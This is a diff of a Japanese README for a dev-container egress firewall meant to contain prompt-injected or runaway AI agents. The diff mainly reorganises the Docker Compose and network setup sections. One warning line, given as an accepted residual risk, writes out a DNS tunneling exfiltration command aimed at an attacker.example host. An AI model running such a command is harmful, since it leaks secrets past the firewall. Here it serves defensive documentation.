@@ -4,7 +4,16 @@
 
 allowlist に載っていない宛先への外向き通信を遮断し、DNS をコンテナに割り当てられたリゾルバに固定します。プロンプトインジェクションやエージェントの暴走が起きても、秘密やソースコードを書き出せる先を限定することが目的です。
 
-仕様の詳細は [`docs/spec.md`](./docs/spec.md) を参照してください。
+**先に読むと速いもの:** [`docs/spec.md`](./docs/spec.md) §1 の不変条件（I1〜I7）→ [`docs/design.md`](./docs/design.md) §1 の脅威モデル → 本 README。この 3 つで「何を守っていて、誰から守っているか」という前提が掴めます。本 README はその前提の上に立った**使い方**です。
+
+| 文書 | 内容 | 見るとき |
+|---|---|---|
+| 本 README | 使い方（セットアップと運用） | 導入する / 運用でつまずいた |
+| [`docs/spec.md`](./docs/spec.md) | **何が成り立つか**（不変条件・スクリプト仕様・受け入れ基準） | 挙動の正確な定義が要る |
+| [`docs/design.md`](./docs/design.md) | **なぜそう作ったか**（脅威モデル・設計判断・受容した残余リスク） | 「なぜこうなっていないのか」と思った |
+| [`docs/known-issues.md`](./docs/known-issues.md) | 未解決のもの（未実装・未検証・保留） | 踏んだ問題が既知かどうか調べる |
+| [`docs/verification-record.md`](./docs/verification-record.md) | 受け入れ検証の記録（カバレッジ・見逃した欠陥・手順） | 何がどこまで確かめられているか知りたい |
+| [`docs/web-search-fetch.md`](./docs/web-search-fetch.md) | 参考: Claude Code の WebSearch / WebFetch と egress の関係（本パッケージの仕様ではありません） | Web 取得が通らない |
 
 ---
 
@@ -69,88 +78,6 @@ capability は `NET_ADMIN` と `NET_RAW`。**書く場所は構成で変わり�
 
 > **これで DNS トンネリングは防げません。** 許可されたリゾルバは再帰問い合わせをするため、`dig <秘密をエンコードした名前>.attacker.example` は通ります。**埋め込みリゾルバでも同じです。** 受容している残余リスクとして扱っています（[`docs/design.md`](./docs/design.md) §3.1）。
 
-## ネットワーク構成（推奨）
-
-**推奨は「ユーザー定義ネットワークを、プロジェクトごとに 1 つ」です。**
-
-* **Docker の埋め込みリゾルバ `127.0.0.11` が使えます。** デフォルトブリッジでは、ホスト側の DNS アドレス宛に外向きの穴が 1 つ開きます
-* **1 つのネットワークを全プロジェクトで共有しないでください。** 同居するコンテナが相互に到達できる状態になります
-
-**これは推奨であって必須要件ではありません。** 埋め込みリゾルバでない構成では警告が出ますが、動作します。
-
-判断の根拠（リゾルバの選択で何が変わるか、ホストの OS で影響が変わること、埋め込みリゾルバのデメリット、共有時に守れない点）は [`docs/design.md`](./docs/design.md) §4 を参照してください。
-
-### 案 A: Docker Compose を使う（推奨）
-
-**Compose はプロジェクトごとのユーザー定義ネットワーク（`<project>_default`）を自動で作ります。** `initializeCommand` も `--network` も不要で、`docker compose down` でネットワークも消えます。
-
-```yaml
-# .devcontainer/docker-compose.yml
-services:
-  dev:
-    build:
-      context: .
-      dockerfile: Dockerfile
-    cap_add:
-      - NET_ADMIN
-      - NET_RAW
-    volumes:
-      - ../..:/workspaces:cached
-    command: sleep infinity
-```
-
-```jsonc
-// .devcontainer/devcontainer.json
-{
-  "name": "my project",
-  "dockerComposeFile": "docker-compose.yml",
-  "service": "dev",
-  "workspaceFolder": "/workspaces/my-project",
-  "remoteUser": "node",
-  "postStartCommand": "sudo /usr/local/bin/init-project-firewall.sh",
-  "waitFor": "postStartCommand"
-}
-```
-
-**注意:** `dockerComposeFile` を使うと `runArgs` は無視されます。`--cap-add` は `cap_add`、`mounts` は `volumes` に書き換えてください。**`${devcontainerId}` は Compose では使えません**（ボリューム名を固定名にする必要があります）。
-
-> **2026-08-03 に実機で検証しました**（[`docs/verification-record.md`](./docs/verification-record.md) §6.22）。動く一式（`docker-compose.yml` と `devcontainer.compose.json`）をこのリポジトリの `.devcontainer/` に置いてあります。
-
-> **案 B から案 A へ切り替えるときは、先に既存コンテナを消してください。** `container_name:` を固定しているため名前が衝突します。**Compose は自分のプロジェクトに属さないコンテナを片付けない**ので、案 B のコンテナは残ったままになります。逆向き（案 A → 案 B）は問題ありません。
->
-> ```sh
-> docker rm -f <container>
-> ```
-
-> **`volumes` のマウント先と `workspaceFolder` を必ず一致させてください。** 案 B では `workspaceMount` と `workspaceFolder` が同じファイルに並びますが、**案 A ではマウント先が `docker-compose.yml`、作業ディレクトリが `devcontainer.json` に分かれ、両者の整合は誰も検査しません。**
->
-> ずれると `postCreateCommand` が **exit 127** で落ちます。`docker exec -w` は存在しない作業ディレクトリを黙って作るため、空のディレクトリの中でコマンドが走り、「スクリプトが見つからない」としか分かりません。**2026-08-03 に `/workspaces`（複数形）と `/workspace`（単数形）の取り違えで実際に踏みました。**
-
-### 案 B: `initializeCommand` でネットワークを用意する
-
-Compose に移行しない場合はこちらです。ネットワーク名にプロジェクト名を含めることで、**設定文字列を全プロジェクトで同一にしたまま**分離できます。
-
-```jsonc
-// .devcontainer/devcontainer.json
-"initializeCommand": "docker network inspect egress-guard-${localWorkspaceFolderBasename} >/dev/null 2>&1 || docker network create egress-guard-${localWorkspaceFolderBasename} 2>/dev/null || true",
-"runArgs": [
-  "--cap-add=NET_ADMIN",
-  "--cap-add=NET_RAW",
-  "--network=egress-guard-${localWorkspaceFolderBasename}"
-]
-```
-
-> 使い終わったネットワークは `initializeCommand` では消えません。案 B を採る場合は定期的に `docker network prune` してください。
-
-### デフォルトブリッジのまま運用する場合
-
-非推奨ですが動作します。起動時に次の警告が出ます。
-
-```
-[firewall] WARNING: DNS pinned to 192.168.65.7 (not the Docker embedded resolver).
-[firewall] WARNING: This container is not on a user defined Docker network. See the README for the stronger setup.
-```
-
 ---
 
 # セットアップ
@@ -208,7 +135,89 @@ USER node
 
 `waitFor` を `postStartCommand` にしておくと、ファイアウォールの適用に失敗した状態でエディタが使えるようになる前に、失敗が表面化します。
 
-### capability の付け方は構成で変わる
+## ネットワーク構成（推奨）
+
+**推奨は「ユーザー定義ネットワークを、プロジェクトごとに 1 つ」です。**
+
+* **Docker の埋め込みリゾルバ `127.0.0.11` が使えます。** デフォルトブリッジでは、ホスト側の DNS アドレス宛に外向きの穴が 1 つ開きます
+* **1 つのネットワークを全プロジェクトで共有しないでください。** 同居するコンテナが相互に到達できる状態になります
+
+**これは推奨であって必須要件ではありません。** 埋め込みリゾルバでない構成では警告が出ますが、動作します。
+
+判断の根拠（リゾルバの選択で何が変わるか、ホストの OS で影響が変わること、埋め込みリゾルバのデメリット、共有時に守れない点）は [`docs/design.md`](./docs/design.md) §4 を参照してください。
+
+### 案 A: Docker Compose を使う（推奨）
+
+**Compose はプロジェクトごとのユーザー定義ネットワーク（`<project>_default`）を自動で作ります。** `initializeCommand` も `--network` も不要で、`docker compose down` でネットワークも消えます。
+
+```yaml
+# .devcontainer/docker-compose.yml
+services:
+  dev:
+    build:
+      context: .
+      dockerfile: Dockerfile
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    volumes:
+      - ../..:/workspaces:cached
+    command: sleep infinity
+```
+
+```jsonc
+// .devcontainer/devcontainer.json
+{
+  "name": "my project",
+  "dockerComposeFile": "docker-compose.yml",
+  "service": "dev",
+  "workspaceFolder": "/workspaces/my-project",
+  "remoteUser": "node",
+  "postStartCommand": "sudo /usr/local/bin/init-project-firewall.sh",
+  "waitFor": "postStartCommand"
+}
+```
+
+**注意:** `dockerComposeFile` を使うと `runArgs` は無視されます。`--cap-add` は `cap_add`、`mounts` は `volumes` に書き換えてください。**`${devcontainerId}` は Compose では使えません**（ボリューム名を固定名にする必要があります）。
+
+> **2026-08-03 に実機で検証しました**（[`docs/verification-record.md`](./docs/verification-record.md) §1 の実施状況。手順は同 §6.22）。動く一式（`docker-compose.yml` と `devcontainer.compose.json`）をこのリポジトリの `.devcontainer/` に置いてあります。
+
+> **案 B から案 A へ切り替えるときは、先に既存コンテナを消してください。** `container_name:` を固定しているため名前が衝突します。**Compose は自分のプロジェクトに属さないコンテナを片付けない**ので、案 B のコンテナは残ったままになります。逆向き（案 A → 案 B）は問題ありません。
+>
+> ```sh
+> docker rm -f <container>
+> ```
+
+> **`volumes` のマウント先と `workspaceFolder` を必ず一致させてください。** 案 B では `workspaceMount` と `workspaceFolder` が同じファイルに並びますが、**案 A ではマウント先が `docker-compose.yml`、作業ディレクトリが `devcontainer.json` に分かれ、両者の整合は誰も検査しません。**
+>
+> ずれると `postCreateCommand` が **exit 127** で落ちます。`docker exec -w` は存在しない作業ディレクトリを黙って作るため、空のディレクトリの中でコマンドが走り、「スクリプトが見つからない」としか分かりません。**2026-08-03 に `/workspaces`（複数形）と `/workspace`（単数形）の取り違えで実際に踏みました。**
+
+### 案 B: `initializeCommand` でネットワークを用意する
+
+Compose に移行しない場合はこちらです。ネットワーク名にプロジェクト名を含めることで、**設定文字列を全プロジェクトで同一にしたまま**分離できます。
+
+```jsonc
+// .devcontainer/devcontainer.json
+"initializeCommand": "docker network inspect egress-guard-${localWorkspaceFolderBasename} >/dev/null 2>&1 || docker network create egress-guard-${localWorkspaceFolderBasename} 2>/dev/null || true",
+"runArgs": [
+  "--cap-add=NET_ADMIN",
+  "--cap-add=NET_RAW",
+  "--network=egress-guard-${localWorkspaceFolderBasename}"
+]
+```
+
+> 使い終わったネットワークは `initializeCommand` では消えません。案 B を採る場合は定期的に `docker network prune` してください。
+
+### デフォルトブリッジのまま運用する場合
+
+非推奨ですが動作します。起動時に次の警告が出ます。
+
+```
+[firewall] WARNING: DNS pinned to 192.168.65.7 (not the Docker embedded resolver).
+[firewall] WARNING: This container is not on a user defined Docker network. See the README for the stronger setup.
+```
+
+## capability の付け方は構成で変わる
 
 `NET_ADMIN` と `NET_RAW` が要ります。**書く場所が構成で違います。**
 
@@ -217,7 +226,7 @@ USER node
 | Docker Compose（[案 A](#案-a-docker-compose-を使う推奨)。推奨） | `docker-compose.yml` の `cap_add` |
 | `build` + `runArgs`（[案 B](#案-b-initializecommand-でネットワークを用意する)） | `devcontainer.json` の `runArgs` |
 
-**`dockerComposeFile` を使うと `runArgs` は無視されます。** Compose 構成では `devcontainer.json` に `runArgs` を書いても効きません。具体的な書き方は[ネットワーク構成（推奨）](#ネットワーク構成推奨)の各案を参照してください。
+**`dockerComposeFile` を使うと `runArgs` は無視されます。** Compose 構成では `devcontainer.json` に `runArgs` を書いても効きません。具体的な書き方は直前の[ネットワーク構成（推奨）](#ネットワーク構成推奨)の各案を参照してください。
 
 ## 配置はスクリプトが検証します
 
